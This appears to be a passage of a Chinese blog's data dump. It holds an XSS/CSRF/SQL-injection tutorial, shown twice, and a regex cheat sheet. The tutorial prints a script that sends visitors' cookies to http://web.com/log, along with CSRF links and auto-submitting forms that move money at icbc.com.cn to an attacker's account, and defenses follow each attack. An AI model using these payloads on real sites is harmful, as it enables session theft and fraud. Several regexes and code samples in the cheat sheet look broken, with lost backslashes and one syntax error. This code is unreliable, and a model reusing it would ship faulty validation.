alt=\"xss\"></li>\n<li><p>等到再次有人访问这个页面的时候，就可以把那个人的cookie显示出来了！当然不能直接把用户的cookie直接alert出来，而同源策略严格限制了JavaScript的跨域访问，但同源策略并不限制 <code>&lt;img&gt;</code> 这样的标签从别的网站（跨域）去下载图片，所以可以通过创建一个不可见的 <code>&lt;img&gt;</code> ，通过这个 <code>&lt;img&gt;</code> 发cookie到自己的服务器。<br>直接上代码：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"img\"</span>);</span><br><span class=\"line\">img.src = <span class=\"string\">\"http://web.com/log?\"</span> + <span class=\"built_in\">escape</span>(<span class=\"built_in\">document</span>.cookie);</span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>只要这段代码被执行，用户的cookie就会发送到别人的服务器上(<code>http://web.com/log</code>)。再将这段代码封装成一个js文件(web.js)。<br><img src=\"/images/xss2.png\" alt=\"xss\"><br>这样就可以拿到用户的cookie。这种窃取用户的cookie的方法叫做XSS。<br><code>注：</code>按照XSS的分类方法，上面介绍的叫做存储性XSS，危害最大。还有反射型XSS，基于DOM的XSS，本文不再展开。</p>\n</li>\n</ol>\n</li>\n<li><strong>如何防范 <code>XSS</code>：</strong><ul>\n<li>首先代码里对用户输入的地方和变量都需要仔细检查长度和对<code>&lt;</code>,<code>&gt;</code>,<code>;</code>,<code>&#39;</code>等字符做过滤；其次任何内容写到页面之前都必须加以 <code>encode</code>，避免不小心把 <code>html tag</code> 弄出来。这一个层面做好，至少可以堵住超过一半的XSS攻击</li>\n<li>避免直接在cookie 中泄露用户隐私，例如email、密码等等</li>\n<li>其次，通过使cookie 和系统 <code>ip</code> 绑定来降低cookie 泄露后的危险。这样攻击者得到的cookie 没有实际价值，不可能拿来重放</li>\n<li>如果网站不需要再浏览器端对cookie 进行操作，可以在 <code>Set-Cookie</code> 末尾加上 <code>HttpOnly</code> 来防止javascript 代码直接获取cookie </li>\n<li>尽量采用POST 而非GET 提交表单</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"2、CSRF-跨站请求伪造\"><a href=\"#2、CSRF-跨站请求伪造\" class=\"headerlink\" title=\"2、CSRF-跨站请求伪造\"></a><a name=\"csrf\">2、CSRF-跨站请求伪造</a></h4><ul>\n<li><strong>什么是 <code>CSRF</code>：</strong><ul>\n<li><code>CSRF</code>：跨站请求伪造（英语：<code>Cross-site request forgery</code>），也被称为 <code>one-click attack</code> 或者 <code>session riding</code>，通常缩写为 <code>CSRF</code> 或者 <code>XSRF</code>， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。</li>\n<li>即：冒充用户发起请求（在用户不知情的情况下）,完成一些违背用户意愿的请求（如恶意发帖，删帖，改密码，发邮件等）。</li>\n</ul>\n</li>\n<li><p><strong>如何做到 <code>CSRF</code>：</strong></p>\n<ol>\n<li><p>一个用户的会话cookie在浏览器没有关闭的时候，是不会被删除的，所以可以换个思路，不再去偷这个cookie了，相反，可以在web.com中构造一个领奖页面，里面包含一个连接，让用户去惦记，例如：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">恭喜你获得了iPhoneX一台，快来<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"www.icbc.com.cn/transfer?toBankId=黑客的账户&amp;money=金额\"</span>&gt;</span>领取<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span>吧</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>这得先知道icbc.com.cn的转账操作的url和参数名称。如果这个用户恰好登录了icbc.com，那他的cookie还在，当他禁不住诱惑，点了这个链接后，一个转账操作就神不知鬼不觉的发生了。<br><code>注：</code>为了方便展示，本文举了一个非常简单的案例，银行实际的转账操作要远远比文章描述安全的多。</p>\n</li>\n<li>除了让用户点击外，还可以使用img标签 <code>&lt;img src=&quot;www.icbc.com.cn/transfer?toAccountID=黑客三兄弟的账户&amp;money=金额&quot;&gt;</code>，只要用户打开了这个页面，不点击任何东西，就会发生转账操作。所以现在有很多邮箱默认是不显示邮件中的图片的。</li>\n<li><p>如果icbc.com.cn的转账操作需要form表单，是POST操作，那么可以自己创建一个表单，放到一个不可见的iframe中，用户只要一访问，就用JavaScript自动提交：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"http://www.icbc.com.cn/transfer\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"POST\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"toAccountID\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"黑客的账号\"</span>/&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"money\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"金额\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>总之，只要用户在访问icbc.com.cn的时候，访问了web.com，就极有可能中招，这种方式，只是利用了一下合法的Cookie，在服务器看来，发出的这个请求是一次合法的请求。这个就叫跨站请求伪造，Cross Site Request Forgest (CSRF)。</p>\n</li>\n</ol>\n</li>\n<li><p><strong>如何防范 <code>CSRF</code>：</strong></p>\n<ol>\n<li><p>用户在icbc.com.cn转账，显示转账的form，除了常用的字段之外，额外添加一个token:</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"http://www.icbc.com.cn/transfer\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"POST\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"token\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"axsa;dsww98725678836554xskdhf82735672\"</span>/&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"toAccountID\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"黑客的账号\"</span>/&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"money\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"金额\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 这个token是icbc.com服务器端生成的，是一个随机的数字。 --&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>用户的转账数据发送的服务器端，icbc.com就会检查从浏览器发过来的数据中有没有token，并且这个token的值是不是和服务器端保存的相等，如果相等，就继续执行转账操作，如果不相等，那这次POST请求肯定是伪造的。<br>这个token是服务器端生成的，无法伪造，CSRF的手段也不行了。</p>\n</li>\n<li>服务端的CSRF方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数，或者通过验证码的方法。</li>\n</ol>\n</li>\n</ul>\n<h4 id=\"3、SQL-注入\"><a href=\"#3、SQL-注入\" class=\"headerlink\" title=\"3、SQL 注入\"></a><a name=\"sql\">3、SQL 注入</a></h4><ul>\n<li><strong>什么是 <code>SQL</code> 注入：</strong><ul>\n<li>就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</li>\n</ul>\n</li>\n<li><strong>如何防范：</strong><ol>\n<li>永远不要信任用户的输入，要对用户的输入进行校验，可以通过正则表达式，或限制长度，对单引号和双”-“进行转换等。</li>\n<li>永远不要使用动态拼装SQL，可以使用参数化的SQL或者直接使用存储过程进行数据查询存取。</li>\n<li>永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。</li>\n<li>不要把机密信息明文存放，请加密或者hash掉密码和敏感的信息。</li>\n</ol>\n</li>\n</ul>\n<p style=\"text-align: right;\"><code>参考文档</code> <a href=\"https://segmentfault.com/a/1190000013022789\" target=\"_blank\" rel=\"noopener\">segmentfault</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"#xss\">1. XSS-跨站脚本攻击</a><br><a href=\"#csrf\">2. CSRF-跨站请求伪造</a><br><a href=\"#sql\">3. SQL 注入</a></p>\n<ul>\n<li>通常来说CSRF是由XSS实现的，所以CSRF时常也被称为XSRF[用XSS的方式实现伪造请求]（但实现的方式绝不止一种，还可以直接通过命令行模式（命令行敲命令来发起请求）直接伪造请求[只要通过合法验证即可]）。</li>\n<li>XSS更偏向于代码实现（即写一段拥有跨站请求功能的JavaScript脚本注入到一条帖子里，然后有用户访问了这个帖子，这就算是中了XSS攻击了），CSRF更偏向于一个攻击结果，只要发起了冒牌请求那么就算是CSRF了。</li>\n</ul>\n<h4 id=\"1、XSS-跨站脚本攻击\"><a href=\"#1、XSS-跨站脚本攻击\" class=\"headerlink\" title=\"1、XSS-跨站脚本攻击\"></a><a name=\"xss\">1、XSS-跨站脚本攻击</a></h4><ul>\n<li><strong>什么是 <code>XSS</code>：</strong><ul>\n<li><code>XSS</code>：跨站脚本（<code>Cross-site scripting</code>，通常简称为 <code>XSS</code>）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了 <code>HTML</code> 以及用户端脚本(<code>JavaScript</code>)语言。</li>\n<li>即：通过客户端脚本语言（最常见如：<code>JavaScript</code>）在一个论坛发帖中发布一段恶意的 <code>JavaScript</code> 代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫做<code>XSS</code>！</li>\n</ul>\n</li>\n<li><p><strong>如何做到 <code>XSS</code>：</strong></p>\n<ol>\n<li>利用别人的 <code>cookie</code>，可以冒充真实的用户，在颁发 <code>cookie</code> 的那个网站中为所欲为。因为浏览器的同源策略，所以不能获取到其他网站的cookie，但通过把JavaScript代码注入到目标页面中，就能绕过同源策略，比如在HTML的 <code>&lt;input&gt;</code> 中注入JavaScript代码，等到数据提交到服务器端，会保存下来，下次展示页面的时候，就会执行这段代码。<br>举例有这样一个网站，可以让你对某个文章输入评论：<br><img src=\"/images/xss1.png\" alt=\"xss\"></li>\n<li><p>等到再次有人访问这个页面的时候，就可以把那个人的cookie显示出来了！当然不能直接把用户的cookie直接alert出来，而同源策略严格限制了JavaScript的跨域访问，但同源策略并不限制 <code>&lt;img&gt;</code> 这样的标签从别的网站（跨域）去下载图片，所以可以通过创建一个不可见的 <code>&lt;img&gt;</code> ，通过这个 <code>&lt;img&gt;</code> 发cookie到自己的服务器。<br>直接上代码：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"img\"</span>);</span><br><span class=\"line\">img.src = <span class=\"string\">\"http://web.com/log?\"</span> + <span class=\"built_in\">escape</span>(<span class=\"built_in\">document</span>.cookie);</span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>只要这段代码被执行，用户的cookie就会发送到别人的服务器上(<code>http://web.com/log</code>)。再将这段代码封装成一个js文件(web.js)。<br><img src=\"/images/xss2.png\" alt=\"xss\"><br>这样就可以拿到用户的cookie。这种窃取用户的cookie的方法叫做XSS。<br><code>注：</code>按照XSS的分类方法，上面介绍的叫做存储性XSS，危害最大。还有反射型XSS，基于DOM的XSS，本文不再展开。</p>\n</li>\n</ol>\n</li>\n<li><strong>如何防范 <code>XSS</code>：</strong><ul>\n<li>首先代码里对用户输入的地方和变量都需要仔细检查长度和对<code>&lt;</code>,<code>&gt;</code>,<code>;</code>,<code>&#39;</code>等字符做过滤；其次任何内容写到页面之前都必须加以 <code>encode</code>，避免不小心把 <code>html tag</code> 弄出来。这一个层面做好，至少可以堵住超过一半的XSS攻击</li>\n<li>避免直接在cookie 中泄露用户隐私，例如email、密码等等</li>\n<li>其次，通过使cookie 和系统 <code>ip</code> 绑定来降低cookie 泄露后的危险。这样攻击者得到的cookie 没有实际价值，不可能拿来重放</li>\n<li>如果网站不需要再浏览器端对cookie 进行操作，可以在 <code>Set-Cookie</code> 末尾加上 <code>HttpOnly</code> 来防止javascript 代码直接获取cookie </li>\n<li>尽量采用POST 而非GET 提交表单</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"2、CSRF-跨站请求伪造\"><a href=\"#2、CSRF-跨站请求伪造\" class=\"headerlink\" title=\"2、CSRF-跨站请求伪造\"></a><a name=\"csrf\">2、CSRF-跨站请求伪造</a></h4><ul>\n<li><strong>什么是 <code>CSRF</code>：</strong><ul>\n<li><code>CSRF</code>：跨站请求伪造（英语：<code>Cross-site request forgery</code>），也被称为 <code>one-click attack</code> 或者 <code>session riding</code>，通常缩写为 <code>CSRF</code> 或者 <code>XSRF</code>， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。</li>\n<li>即：冒充用户发起请求（在用户不知情的情况下）,完成一些违背用户意愿的请求（如恶意发帖，删帖，改密码，发邮件等）。</li>\n</ul>\n</li>\n<li><p><strong>如何做到 <code>CSRF</code>：</strong></p>\n<ol>\n<li><p>一个用户的会话cookie在浏览器没有关闭的时候，是不会被删除的，所以可以换个思路，不再去偷这个cookie了，相反，可以在web.com中构造一个领奖页面，里面包含一个连接，让用户去惦记，例如：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">恭喜你获得了iPhoneX一台，快来<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"www.icbc.com.cn/transfer?toBankId=黑客的账户&amp;money=金额\"</span>&gt;</span>领取<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span>吧</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>这得先知道icbc.com.cn的转账操作的url和参数名称。如果这个用户恰好登录了icbc.com，那他的cookie还在，当他禁不住诱惑，点了这个链接后，一个转账操作就神不知鬼不觉的发生了。<br><code>注：</code>为了方便展示，本文举了一个非常简单的案例，银行实际的转账操作要远远比文章描述安全的多。</p>\n</li>\n<li>除了让用户点击外，还可以使用img标签 <code>&lt;img src=&quot;www.icbc.com.cn/transfer?toAccountID=黑客三兄弟的账户&amp;money=金额&quot;&gt;</code>，只要用户打开了这个页面，不点击任何东西，就会发生转账操作。所以现在有很多邮箱默认是不显示邮件中的图片的。</li>\n<li><p>如果icbc.com.cn的转账操作需要form表单，是POST操作，那么可以自己创建一个表单，放到一个不可见的iframe中，用户只要一访问，就用JavaScript自动提交：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"http://www.icbc.com.cn/transfer\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"POST\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"toAccountID\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"黑客的账号\"</span>/&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"money\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"金额\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>总之，只要用户在访问icbc.com.cn的时候，访问了web.com，就极有可能中招，这种方式，只是利用了一下合法的Cookie，在服务器看来，发出的这个请求是一次合法的请求。这个就叫跨站请求伪造，Cross Site Request Forgest (CSRF)。</p>\n</li>\n</ol>\n</li>\n<li><p><strong>如何防范 <code>CSRF</code>：</strong></p>\n<ol>\n<li><p>用户在icbc.com.cn转账，显示转账的form，除了常用的字段之外，额外添加一个token:</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"http://www.icbc.com.cn/transfer\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"POST\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"token\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"axsa;dsww98725678836554xskdhf82735672\"</span>/&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"toAccountID\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"黑客的账号\"</span>/&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"money\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"金额\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 这个token是icbc.com服务器端生成的，是一个随机的数字。 --&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>用户的转账数据发送的服务器端，icbc.com就会检查从浏览器发过来的数据中有没有token，并且这个token的值是不是和服务器端保存的相等，如果相等，就继续执行转账操作，如果不相等，那这次POST请求肯定是伪造的。<br>这个token是服务器端生成的，无法伪造，CSRF的手段也不行了。</p>\n</li>\n<li>服务端的CSRF方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数，或者通过验证码的方法。</li>\n</ol>\n</li>\n</ul>\n<h4 id=\"3、SQL-注入\"><a href=\"#3、SQL-注入\" class=\"headerlink\" title=\"3、SQL 注入\"></a><a name=\"sql\">3、SQL 注入</a></h4><ul>\n<li><strong>什么是 <code>SQL</code> 注入：</strong><ul>\n<li>就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</li>\n</ul>\n</li>\n<li><strong>如何防范：</strong><ol>\n<li>永远不要信任用户的输入，要对用户的输入进行校验，可以通过正则表达式，或限制长度，对单引号和双”-“进行转换等。</li>\n<li>永远不要使用动态拼装SQL，可以使用参数化的SQL或者直接使用存储过程进行数据查询存取。</li>\n<li>永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。</li>\n<li>不要把机密信息明文存放，请加密或者hash掉密码和敏感的信息。</li>\n</ol>\n</li>\n</ul>\n<p style=\"text-align: right;\"><code>参考文档</code> <a href=\"https://segmentfault.com/a/1190000013022789\" target=\"_blank\" rel=\"noopener\">segmentfault</a></p>\n"},{"id":"0809028","title":"常用正则表达式总结","date":"2017-06-20T11:48:02.000Z","_content":"\n- 常用的输入验证\n\n|  模式 |  表达式 |\n| - | - |\n|1. 非负整数                                    | **/^\\d+$/**\n|2. 正整数                                      | **/^[0-9]*[1-9][0-9]*$/**\n|3. 非正整数                                    | **/^((-\\d+)&#124;(0+))$/**\n|4. 负整数                                      | **/^-[0-9]*[1-9][0-9]*$/**\n|5. 整数                                        | **/^-?\\d+$/**\n|6. 非负浮点数                                  | **/^\\d+(\\.\\d+)?$/**\n|7. 正浮点数                                    | **/^(([0-9]+\\.[0-9]*[1-9][0-9]*)&#124;([0-9]*[1-9][0-9]*\\.[0-9]+)&#124;([0-9]*[1-9][0-9]*))$/**\n|8. 非正浮点数                                  | **/^((-\\d+(\\.\\d+)?)&#124;(0+(\\.0+)?))$/**\n|9. 负浮点数                                    | **/^(-(([0-9]+\\.[0-9]*[1-9][0-9]*)&#124;([0-9]*[1-9][0-9]*\\.[0-9]+)&#124;([0-9]*[1-9][0-9]*)))$/**\n|10. 浮点数                                     | **/^(-?\\d+)(\\.\\d+)?$/**\n|11. 数字                                       | **/^\\d+(\\.{1}\\d+)?$/**\n|12. 由26个英文字母组成的字符串                   | **/^[A-Za-z]+$/**\n|13. 由26个英文字母的大写组成的字符串             | **/^[A-Z]+$/**\n|14. 由26个英文字母的小写组成的字符串             | **/^[a-z]+$/**\n|15. 由数字和26个英文字母组成的字符串             | **/^[A-Za-z0-9]+$/**\n|16. 由数字、26个英文字母或者下划线组成的字符串    | **/^\\w+$/**\n|17. 匹配所有单字节长度的字符组成的字符串          | **/^[\\x00-\\xff]+$/**\n|18. 匹配所有双字节长度的字符组成的字符串          | **/^[^\\x00-\\xff]+$/**\n|19. 字符串是否含有双字节字                       | **/[^\\x00-\\xff]+/**\n|20. 匹配中文字符的正则                           | **/[u4e00-u9fa5]/**\n|21. 匹配空行的正则                               | **/n[s&#124; ]*r/**\n|22. 匹配HTML标记的正则                           | **/<(.*)>.*</1>&#124;<(.*) />/**\n|23. 验证文件名由字母，数字，下滑线组成             | **/^((\\w+)(\\.{1})(\\w+))$/**\n|24. 整数或者小数                                 | **/^[0-9]+\\.{0,1}[0-9]{0,2}$/**\n|25. 只能输入数字                                 | **/^[0-9]*$/**\n|26. 只能输入n位的数字                            | **/^\\d{n}$/**\n|27. 只能输入至少n位的数字                        | **/^\\d{n,}$/**\n|28. 只能输入m~n位的数字                          | **/^\\d{m,n}$/**\n|29. 由数字、26个英文字母或者下划线组成的字符串     | **/^\\w+$/**\n|30. 手机号                                      | **/^1[3456789]\\d{9}$/** 或 **/^1\\d{10}$/**\n\n- 常用的用户名、密码验证\n\n|  模式  |  表达式  |\n| - | - |\n|4到16位（字母，数字，下划线，减号）     | **/^[a-zA-Z0-9_-]{4,16}$/**\n|最少6位，包括至少1个大写字母，1个小写字母，1个数字，1个特殊字符     | **/^.*(?=.{6,})(?=.*\\d)(?=.*[A-Z])(?=.*[a-z])(?=.*[!@#$%^&*? ]).*$/**\n|4到16位（字母，数字，下划线，减号）     | **/^[a-zA-Z0-9_-]{4,16}$/**\n\n\n- 验证身份证号\n```js\nvar reg = /^(^[1-9]\\d{7}((0\\d)|(1[0-2]))(([0|1|2]\\d)|3[0-1])\\d{3}$)|(^[1-9]\\d{5}[1-9]\\d{3}((0\\d)|(1[0-2]))(([0|1|2]\\d)|3[0-1])((\\d{4})|\\d{3}[Xx])$)$/;\n```\n\n- email地址\n```sh\n# 第一种\n/^[\\w-]+(\\.[\\w-]+)*@[\\w-]+(\\.[\\w-]+)+$/\n# 第二种\n/w+([-+.]w+)*@w+([-.]w+)*.w+([-.]w+)*/\n```\n\n- url地址\n```sh\n# 第一种\n/^[a-zA-z]+://(\\w+(-\\w+)*)(\\.(\\w+(-\\w+)*))*(\\?\\S*)?$/\n# 第二种\n/http://([w-]+.)+[w-]+(/[w- ./?%&=]*)?/\n```\n\n- 匹配双字节字符(包括汉字在内) \n```js\n/[^x00-xff]/\n\n// 应用：计算字符串的长度(一个双字节字符长度计2，ASCII字符计1)\nString.prototype.len=function(){\n  return this.replace([^x00-xff]/g,\"aa\").length;\n}\n```\n\n- 匹配首尾空格的正则               \n```js\n/(^s*)|(s*$)/\n\n// 应用：javascript中没有像vbscript那样的trim函数，我们就可以利用这个表达式来实现，如下：\nString.prototype.trim = function(){\n  return this.replace(/(^s*)|(s*$)/g, \"\");\n}\n```\n\n- 去除字串中重复的字符的javascript程序\n```js\nvar s  = \"abacabefgeeii\";\nvar s1 = s.replace(/(.).*1/g, \"$1\");\nvar re = new RegExp(\"[\"+s1+\"]\", \"g\");\nvar s2 = s.replace(re, \"\");\nalert(s1+s2); // 结果为：abcefgi\n\n// 使用后向引用取出包括重复的字符，再以重复的字符建立第二个表达式，取到不重复的字符，\n// 两者串连。这个方法对于字符顺序有要求的字符串可能不适用。\n```\n\n- 用正则表达式从URL地址中提取文件名的javascript程序\n```js\nvar s = \"http://www.9499.net/page1.html\";\ns = s.replace(/(.*/){0,}([^.]+).*/ig, \"$2\");\nalert(s); // 结果为page1\n```\n\n- 限制表单文本框输入内容\n```js\n// 只能输入中文：\nonkeyup=\"value=value.replace(/[^u4E00-u9FA5]/g,'')\" \nonbeforepaste=\"clipboardData.setData('text', clipboardData.getData('text').replace(/[^u4E00-u9FA5]/g,''))\"\n\n// 只能输入全角字符：\nonkeyup=\"value=value.replace(/[^uFF00-uFFFF]/g,'')\" \nonbeforepaste=\"clipboardData.setData('text', clipboardData.getData('text').replace(/[^uFF00-uFFFF]/g,''))\"\n\n// 只能输入数字：\nonkeyup=\"value=value.replace(/[^d]/g,'')\" \nonbeforepaste=\"clipboardData.setData('text', clipboardData.getData('text').replace(/[^d]/g,''))\"\n\n// 只能输入数字和英文：\nonkeyup=\"value=value.replace(/[W]/g,'')\" \nonbeforepaste=\"clipboardData.setData('text', clipboardData.getData('text').replace(/[^d]/g,''))\"\n```","source":"_posts/0809028_常用正则表达式总结.md","raw":"---\nid: 0809028\ntitle: 常用正则表达式总结\ndate: 2017-06-20 19:48:02\ntags:\n  - JavaScript\ncategories:\n---\n\n- 常用的输入验证\n\n|  模式 |  表达式 |\n| - | - |\n|1. 非负整数                                    | **/^\\d+$/**\n|2. 正整数                                      | **/^[0-9]*[1-9][0-9]*$/**\n|3. 非正整数                                    | **/^((-\\d+)&#124;(0+))$/**\n|4. 负整数                                      | **/^-[0-9]*[1-9][0-9]*$/**\n|5. 整数                                        | **/^-?\\d+$/**\n|6. 非负浮点数                                  | **/^\\d+(\\.\\d+)?$/**\n|7. 正浮点数                                    | **/^(([0-9]+\\.[0-9]*[1-9][0-9]*)&#124;([0-9]*[1-9][0-9]*\\.[0-9]+)&#124;([0-9]*[1-9][0-9]*))$/**\n|8. 非正浮点数                                  | **/^((-\\d+(\\.\\d+)?)&#124;(0+(\\.0+)?))$/**\n|9. 负浮点数                                    | **/^(-(([0-9]+\\.[0-9]*[1-9][0-9]*)&#124;([0-9]*[1-9][0-9]*\\.[0-9]+)&#124;([0-9]*[1-9][0-9]*)))$/**\n|10. 浮点数                                     | **/^(-?\\d+)(\\.\\d+)?$/**\n|11. 数字                                       | **/^\\d+(\\.{1}\\d+)?$/**\n|12. 由26个英文字母组成的字符串                   | **/^[A-Za-z]+$/**\n|13. 由26个英文字母的大写组成的字符串             | **/^[A-Z]+$/**\n|14. 由26个英文字母的小写组成的字符串             | **/^[a-z]+$/**\n|15. 由数字和26个英文字母组成的字符串             | **/^[A-Za-z0-9]+$/**\n|16. 由数字、26个英文字母或者下划线组成的字符串    | **/^\\w+$/**\n|17. 匹配所有单字节长度的字符组成的字符串          | **/^[\\x00-\\xff]+$/**\n|18. 匹配所有双字节长度的字符组成的字符串          | **/^[^\\x00-\\xff]+$/**\n|19. 字符串是否含有双字节字                       | **/[^\\x00-\\xff]+/**\n|20. 匹配中文字符的正则                           | **/[u4e00-u9fa5]/**\n|21. 匹配空行的正则                               | **/n[s&#124; ]*r/**\n|22. 匹配HTML标记的正则                           | **/<(.*)>.*</1>&#124;<(.*) />/**\n|23. 验证文件名由字母，数字，下滑线组成             | **/^((\\w+)(\\.{1})(\\w+))$/**\n|24. 整数或者小数                                 | **/^[0-9]+\\.{0,1}[0-9]{0,2}$/**\n|25. 只能输入数字                                 | **/^[0-9]*$/**\n|26. 只能输入n位的数字                            | **/^\\d{n}$/**\n|27. 只能输入至少n位的数字                        | **/^\\d{n,}$/**\n|28. 只能输入m~n位的数字                          | **/^\\d{m,n}$/**\n|29. 由数字、26个英文字母或者下划线组成的字符串     | **/^\\w+$/**\n|30. 手机号                                      | 